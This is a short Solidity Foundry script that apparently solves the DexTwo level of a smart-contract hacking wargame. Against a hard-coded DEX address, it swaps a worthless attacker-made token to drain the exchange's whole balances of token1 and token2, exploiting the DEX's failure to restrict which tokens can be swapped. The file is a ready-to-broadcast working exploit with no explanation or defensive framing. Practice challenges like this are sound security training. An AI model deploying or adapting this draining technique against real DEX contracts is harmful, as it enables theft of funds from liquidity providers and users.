// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexTwo} from "../src/Dex2.sol";

contract DeployDex2AttackSwap is Script {

    DexTwo public dexTwo;

    function run() external{
        vm.startBroadcast();

        dexTwo = DexTwo(0x8cB3D36C8647F4dD201D85862Dbd76a31A611Fea);
        address BTN = address(0x922d8de2ABB85f3bfB264C46Fe3Da06a8160A51e);
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        uint256 btnBalance = dexTwo.balanceOf(BTN, address(this));
        require(btnBalance >= 100, "Not enough BTN tokens to swap");

        dexTwo.swap(BTN, token1, 100);
        dexTwo.swap(BTN, token2, 200);

        console.log("Remaining token1 balance : ", dexTwo.balanceOf(token1, address(dexTwo)));
        console.log("Remaining token2 balance : ", dexTwo.balanceOf(token2, address(dexTwo)));

        vm.stopBroadcast();
    }
}
